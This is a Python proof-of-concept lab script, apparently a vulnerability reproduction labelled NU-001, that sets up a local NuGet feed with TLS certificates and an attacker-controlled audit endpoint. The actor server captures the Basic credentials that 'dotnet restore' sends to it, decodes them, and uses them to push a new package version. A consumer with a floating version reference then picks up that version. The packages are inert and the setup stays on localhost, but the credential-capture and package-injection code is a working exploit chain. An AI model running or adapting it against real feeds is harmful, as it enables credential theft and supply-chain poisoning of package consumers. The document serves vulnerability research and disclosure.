"""Disposable Ubuntu Actions lab for NU-001. All credentials and packages are inert."""

import base64
import hashlib
import io
import json
import os
from pathlib import Path
import re
import secrets
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET
import zipfile
from email import policy
from email.parser import BytesParser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


def shell(args, **kwargs):
    return subprocess.run(args, check=True, stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, text=True, **kwargs)


def port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def http_status(url, method="GET", body=None):
    req = urllib.request.Request(url, data=body, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.status
    except urllib.error.HTTPError as error:
        return error.code


def make_package(baseline, path, version):
    with zipfile.ZipFile(baseline) as original, zipfile.ZipFile(path, "w") as derived:
        for item in original.infolist():
            data = original.read(item.filename)
            if item.filename.endswith((".nuspec", ".psmdcp")):
                data = data.replace(b"<version>1.0.0</version>",
                                    f"<version>{version}</version>".encode())
            derived.writestr(item.filename, data)


def configure_certificates(root):
    ca, ca_key = root / "ca.crt", root / "ca.key"
    shell(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
           "-days", "1", "-subj", "/CN=NU001-Owned-Runner-CA",
           "-addext", "basicConstraints=critical,CA:TRUE",
           "-addext", "keyUsage=critical,keyCertSign,cRLSign",
           "-keyout", str(ca_key), "-out", str(ca)])
    for name in ("feed", "actor"):
        cert, key, csr = root / f"{name}.crt", root / f"{name}.key", root / f"{name}.csr"
        shell(["openssl", "req", "-newkey", "rsa:2048", "-nodes",
               "-subj", f"/CN={name}.nu001.local", "-keyout", str(key), "-out", str(csr)])
        ext = root / f"{name}.ext"
        ext.write_text("basicConstraints=critical,CA:FALSE\n"
                       "keyUsage=critical,digitalSignature,keyEncipherment\n"
                       "extendedKeyUsage=serverAuth\n"
                       "subjectAltName=DNS:localhost,IP:127.0.0.1\n")
        shell(["openssl", "x509", "-req", "-in", str(csr), "-CA", str(ca),
               "-CAkey", str(ca_key), "-CAcreateserial", "-days", "1",
               "-out", str(cert), "-extfile", str(ext)])
    (root / "feed.key").chmod(0o600)
    (root / "actor.key").chmod(0o644)
    (root / "actor.crt").chmod(0o644)
    shell(["sudo", "cp", str(ca), "/usr/local/share/ca-certificates/nu001-owned-runner.crt"])
    shell(["sudo", "update-ca-certificates"])


def read_body(handler):
    cap = 5_000_000
    transfer = handler.headers.get("Transfer-Encoding", "").lower()
    if "chunked" in transfer:
        result = bytearray()
        while True:
            size_line = handler.rfile.readline(100)
            size = int(size_line.split(b";", 1)[0].strip(), 16)
            if size == 0:
                while handler.rfile.readline(4096) not in (b"\r\n", b"\n", b""):
                    pass
                break
            if len(result) + size > cap:
                raise ValueError("package too large")
            result.extend(handler.rfile.read(size))
            handler.rfile.read(2)
        return bytes(result)
    length = int(handler.headers.get("Content-Length", "0"))
    if length < 1 or length > cap:
        raise ValueError("invalid length")
    return handler.rfile.read(length)


def main_actor(root, feed_url, actor_port, mode, version):
    root = Path(root)
    actorout = root / "actorout"
    victim_config = root / "victim" / "nuget.config"
    feed_root = root / "feedroot"
    results = {"mode": mode, "captured": False, "push_exit": None}
    try:
        victim_config.read_bytes()
        results["victim_config_denied"] = False
    except PermissionError:
        results["victim_config_denied"] = True
    try:
        (root / "feed.key").read_bytes()
        results["feed_key_denied"] = False
    except PermissionError:
        results["feed_key_denied"] = True
    try:
        (feed_root / "direct-bypass").write_text("BYPASS")
        results["direct_feed_write_denied"] = False
    except PermissionError:
        results["direct_feed_write_denied"] = True
    results["direct_publish_status"] = http_status(feed_url + "/api/v2/package", "PUT", b"INERT")

    def save():
        (actorout / "result.json").write_text(json.dumps(results))

    save()

    class ActorHandler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *_):
            pass

        def do_GET(self):
            if self.path != "/audit/page.json":
                self.send_error(404)
                return
            authorization = self.headers.get("Authorization")
            if mode == "basic" and not authorization:
                self.send_response(401)
                self.send_header("WWW-Authenticate", 'Basic realm="owned-audit"')
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            if authorization and not results["captured"]:
                results["captured"] = True
                results["header_sha256"] = hashlib.sha256(authorization.encode()).hexdigest()
                if authorization.startswith("Basic "):
                    decoded = base64.b64decode(authorization[6:], validate=True).decode()
                    username, password = decoded.split(":", 1)
                    config = actorout / "push.config"
                    config.write_text(
                        '<configuration><packageSources><clear/><add key="OwnedFeed" '
                        f'value="{feed_url}/v3/index.json" /></packageSources>'
                        '<packageSourceCredentials><OwnedFeed>'
                        f'<add key="Username" value="{username}" />'
                        f'<add key="ClearTextPassword" value="{password}" />'
                        '</OwnedFeed></packageSourceCredentials></configuration>')
                    config.chmod(0o600)
                    environment = os.environ.copy()
                    environment.update({"DOTNET_CLI_HOME": str(actorout / "home"),
                                        "HOME": str(actorout),
                                        "NUGET_PACKAGES": str(actorout / "packages"),
                                        "NUGET_HTTP_CACHE_PATH": str(actorout / "cache"),
                                        "DOTNET_SKIP_FIRST_TIME_EXPERIENCE": "1",
                                        "DOTNET_CLI_TELEMETRY_OPTOUT": "1"})
                    try:
                        push = subprocess.run(
                            ["dotnet", "nuget", "push", str(root / "actorpackages" / f"Owned.Nu001.{version}.nupkg"),
                             "--source", "OwnedFeed", "--api-key", "INERT", "--configfile", str(config),
                             "--force-english-output"], env=environment, capture_output=True, text=True, timeout=90)
                        results["push_exit"] = push.returncode
                    except subprocess.TimeoutExpired:
                        results["push_exit"] = "timeout"
                    finally:
                        config.unlink(missing_ok=True)
                save()
            data = b"{}"
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    server = ThreadingHTTPServer(("127.0.0.1", int(actor_port)), ActorHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(str(root / "actor.crt"), str(root / "actor.key"))
    server.socket = context.wrap_socket(server.socket, server_side=True)
    server.serve_forever(poll_interval=0.1)


def main():
    sdk = shell(["dotnet", "--version"]).stdout.strip()
    if sdk != "11.0.100":
        raise RuntimeError(f"expected SDK 11.0.100, got {sdk}")
    with tempfile.TemporaryDirectory(prefix="nu001-runner-", ignore_cleanup_errors=True) as scratch:
        root = Path(scratch)
        root.chmod(0o755)
        feed_root = root / "feedroot"
        feed_root.mkdir(mode=0o700)
        actorout = root / "actorout"
        actorout.mkdir(mode=0o777)
        actorout.chmod(0o777)
        actorpackages = root / "actorpackages"
        actorpackages.mkdir(mode=0o755)
        actor_script = root / "actor.py"
        shutil.copy2(Path(__file__).resolve(), actor_script)
        actor_script.chmod(0o644)
        victim = root / "victim"
        victim.mkdir(mode=0o700)
        configure_certificates(root)
        username, password = "feed-operator", secrets.token_urlsafe(24)
        basic = "Basic " + base64.b64encode(f"{username}:{password}".encode()).decode()
        expected_header_sha = hashlib.sha256(basic.encode()).hexdigest()
        feed_port, actor_port = port(), port()
        while actor_port == feed_port:
            actor_port = port()
        feed_url = f"https://127.0.0.1:{feed_port}"
        actor_url = f"https://localhost:{actor_port}"
        baseline = feed_root / "flat" / "owned.nu001" / "1.0.0"
        baseline.mkdir(parents=True)
        package_source = root / "package-source"
        package_source.mkdir()
        (package_source / "Owned.Nu001.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net11.0</TargetFramework>'
            '<PackageId>Owned.Nu001</PackageId><Version>1.0.0</Version><Authors>Owned Lab</Authors>'
            '<Description>Inert owned research package</Description><IncludeBuildOutput>false</IncludeBuildOutput>'
            '<NoPackageAnalysis>true</NoPackageAnalysis><NuGetAudit>false</NuGetAudit>'
            '</PropertyGroup><ItemGroup><None Include="inert.txt" Pack="true" PackagePath="content/" />'
            '</ItemGroup></Project>')
        (package_source / "inert.txt").write_text("INERT_NU001_BASELINE")
        shell(["dotnet", "pack", str(package_source / "Owned.Nu001.csproj"),
               "--output", str(baseline), "--verbosity", "quiet"])
        baseline_package = baseline / "Owned.Nu001.1.0.0.nupkg"
        baseline_package.rename(baseline / "owned.nu001.1.0.0.nupkg")
        baseline_package = baseline / "owned.nu001.1.0.0.nupkg"
        index = feed_root / "flat" / "owned.nu001" / "index.json"
        index.write_text('{"versions":["1.0.0"]}')
        index_json = {"version": "3.0.0", "resources": [
            {"@id": feed_url + "/flat/", "@type": "PackageBaseAddress/3.0.0"},
            {"@id": feed_url + "/audit/index.json", "@type": "VulnerabilityInfo/6.7.0"},
            {"@id": feed_url + "/api/v2/package", "@type": "PackagePublish/2.0.0"}]}
        (feed_root / "v3").mkdir()
        (feed_root / "v3/index.json").write_text(json.dumps(index_json))
        (feed_root / "audit").mkdir()
        (feed_root / "audit/index.json").write_text(json.dumps([
            {"@name": "base", "@id": actor_url + "/audit/page.json",
             "@updated": "2026-11-28T00:00:00Z"}]))

        class FeedHandler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *_):
                pass

            def authorized(self):
                if self.headers.get("Authorization") == basic:
                    return True
                self.send_response(401)
                self.send_header("WWW-Authenticate", 'Basic realm="owned-feed"')
                self.send_header("Content-Length", "0")
                self.end_headers()
                return False

            def do_GET(self):
                if not self.authorized():
                    return
                rel = self.path.split("?", 1)[0].lstrip("/")
                if not re.fullmatch(r"[A-Za-z0-9/._-]+", rel) or ".." in rel:
                    self.send_error(400)
                    return
                path = feed_root / rel
                if not path.is_file():
                    self.send_error(404)
                    return
                data = path.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", "application/json" if path.suffix == ".json" else "application/octet-stream")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_PUT(self):
                if not self.authorized():
                    return
                if self.path != "/api/v2/package" or not self.headers.get("X-NuGet-ApiKey"):
                    self.send_error(404)
                    return
                try:
                    body = read_body(self)
                    content_type = self.headers.get("Content-Type", "")
                    message = BytesParser(policy=policy.default).parsebytes(
                        b"Content-Type: " + content_type.encode() +
                        b"\r\nMIME-Version: 1.0\r\n\r\n" + body)
                    parts = list(message.iter_parts())
                    package = parts[0].get_payload(decode=True)
                    with zipfile.ZipFile(io.BytesIO(package)) as archive:
                        nuspec = [n for n in archive.namelist() if n.endswith(".nuspec")]
                        document = ET.fromstring(archive.read(nuspec[0]))
                        identity = document.findtext(".//{*}id")
                        version = document.findtext(".//{*}version")
                    if identity != "Owned.Nu001" or not re.fullmatch(r"1\.0\.[1-9][0-9]*", version):
                        raise ValueError("unexpected package")
                    package_dir = feed_root / "flat" / "owned.nu001" / version
                    if package_dir.exists():
                        self.send_error(409)
                        return
                    package_dir.mkdir()
                    (package_dir / f"owned.nu001.{version}.nupkg").write_bytes(package)
                    versions = json.loads(index.read_text())["versions"]
                    versions.append(version)
                    index.write_text(json.dumps({"versions": versions}))
                    self.send_response(201)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                except Exception:
                    self.send_error(400)

        server = ThreadingHTTPServer(("127.0.0.1", feed_port), FeedHandler)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(str(root / "feed.crt"), str(root / "feed.key"))
        server.socket = context.wrap_socket(server.socket, server_side=True)
        serving = threading.Thread(target=server.serve_forever, daemon=True)
        serving.start()

        source_cfg = victim / "nuget.config"
        source_cfg.write_text(
            '<configuration><packageSources><clear/><add key="OwnedFeed" '
            f'value="{feed_url}/v3/index.json" /></packageSources>'
            '<packageSourceCredentials><OwnedFeed>'
            f'<add key="Username" value="{username}" />'
            f'<add key="ClearTextPassword" value="{password}" />'
            '</OwnedFeed></packageSourceCredentials></configuration>')
        source_cfg.chmod(0o600)
        outcomes = []
        expected_selected = "1.0.0"
        denied_feed = http_status(feed_url + "/v3/index.json")
        denied_publish = http_status(feed_url + "/api/v2/package", "PUT", b"INERT")
        for arm, mode in enumerate(("none", "basic", "none", "basic")):
            version = f"1.0.{arm + 1}"
            package_path = actorpackages / f"Owned.Nu001.{version}.nupkg"
            make_package(baseline_package, package_path, version)
            package_path.chmod(0o644)
            (actorout / "result.json").unlink(missing_ok=True)
            actor = subprocess.Popen(
                ["sudo", "-u", "nobody", "env", "DOTNET_CLI_TELEMETRY_OPTOUT=1",
                 "PATH=" + os.environ["PATH"],
                 "python3", str(actor_script), "actor", str(root),
                 feed_url, str(actor_port), mode, version],
                cwd=str(actorout), stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
            try:
                for _ in range(100):
                    if actor.poll() is not None:
                        raise RuntimeError("actor server exited before ready")
                    try:
                        if http_status(actor_url + "/audit/page.json") in (200, 401):
                            break
                    except Exception:
                        pass
                    time.sleep(0.1)
                else:
                    raise RuntimeError("actor server did not start")
                project = victim / f"restore-{arm}"
                project.mkdir()
                (project / "Restore.csproj").write_text(
                    '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net11.0</TargetFramework>'
                    '<NuGetAudit>true</NuGetAudit></PropertyGroup><ItemGroup>'
                    '<PackageReference Include="Owned.Nu001" Version="1.0.0" />'
                    '</ItemGroup></Project>')
                env = os.environ.copy()
                env.update({"DOTNET_CLI_HOME": str(victim / "home"),
                            "NUGET_HTTP_CACHE_PATH": str(project / "cache"),
                            "DOTNET_SKIP_FIRST_TIME_EXPERIENCE": "1",
                            "DOTNET_CLI_TELEMETRY_OPTOUT": "1"})
                restored = subprocess.run(
                    ["dotnet", "restore", str(project / "Restore.csproj"),
                     "--configfile", str(source_cfg), "--packages", str(project / "packages"),
                     "--no-cache", "--force-evaluate", "--disable-parallel", "--verbosity", "quiet"],
                    env=env, capture_output=True, text=True, timeout=120)
                actor_result = json.loads((actorout / "result.json").read_text())
                header_matches = actor_result.pop("header_sha256", None) == expected_header_sha
                published = feed_root / "flat" / "owned.nu001" / version / f"owned.nu001.{version}.nupkg"
                exact = published.is_file() and published.read_bytes() == package_path.read_bytes()
                if exact:
                    expected_selected = version
                consumer = victim / f"consumer-{arm}"
                consumer.mkdir()
                (consumer / "Consumer.csproj").write_text(
                    '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net11.0</TargetFramework>'
                    '<NuGetAudit>false</NuGetAudit></PropertyGroup><ItemGroup>'
                    '<PackageReference Include="Owned.Nu001" Version="1.0.*" />'
                    '</ItemGroup></Project>')
                env["NUGET_HTTP_CACHE_PATH"] = str(consumer / "cache")
                consumed = subprocess.run(
                    ["dotnet", "restore", str(consumer / "Consumer.csproj"),
                     "--configfile", str(source_cfg), "--packages", str(consumer / "packages"),
                     "--no-cache", "--force-evaluate", "--disable-parallel", "--verbosity", "quiet"],
                    env=env, capture_output=True, text=True, timeout=120)
                selected = None
                if consumed.returncode == 0:
                    assets = json.loads((consumer / "obj/project.assets.json").read_text())
                    found = [n.split("/", 1)[1] for n in assets["libraries"]
                             if n.lower().startswith("owned.nu001/")]
                    selected = found[0] if len(found) == 1 else None
                outcomes.append({"arm": arm, "mode": mode, "restore_exit": restored.returncode,
                                 "victim_package_present": (project / "packages/owned.nu001/1.0.0/owned.nu001.1.0.0.nupkg").is_file(),
                                 "actor": actor_result, "header_matches": header_matches,
                                 "package_published_exact": exact, "consumer_exit": consumed.returncode,
                                 "consumer_selected": selected, "expected_selected": expected_selected,
                                 "restore_error_tail": (restored.stdout + restored.stderr).replace(password, "<redacted>").replace(basic, "<redacted>")[-500:] if restored.returncode else "",
                                 "consumer_error_tail": (consumed.stdout + consumed.stderr).replace(password, "<redacted>").replace(basic, "<redacted>")[-500:] if consumed.returncode else ""})
            finally:
                actor.terminate()
                try:
                    actor.communicate(timeout=5)
                except subprocess.TimeoutExpired:
                    actor.kill()
                    actor.communicate()
        server.shutdown()
        shell(["sudo", "chown", "-R", f"{os.getuid()}:{os.getgid()}", str(actorout)])
        output = {"sdk": sdk, "platform": "ubuntu GitHub Actions", "origin_pair": "127.0.0.1 and localhost distinct ports",
                  "tls_trusted": True, "actor_os_user": "nobody", "denied_feed": denied_feed,
                  "denied_publish": denied_publish, "arms": outcomes}
        print(json.dumps(output, sort_keys=True))
        assert denied_feed == denied_publish == 401
        assert all(a["restore_exit"] == 0 and a["victim_package_present"] and a["consumer_exit"] == 0 and
                   a["consumer_selected"] == a["expected_selected"] and
                   a["actor"]["victim_config_denied"] and a["actor"]["feed_key_denied"] and
                   a["actor"]["direct_feed_write_denied"] and a["actor"]["direct_publish_status"] == 401
                   for a in outcomes)
        assert all((a["header_matches"] and a["actor"]["push_exit"] == 0 and a["package_published_exact"])
                   if a["mode"] == "basic" else
                   (not a["actor"]["captured"] and a["actor"]["push_exit"] is None and not a["package_published_exact"])
                   for a in outcomes)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "actor":
        main_actor(*sys.argv[2:5], sys.argv[5], sys.argv[6])
    else:
        main()
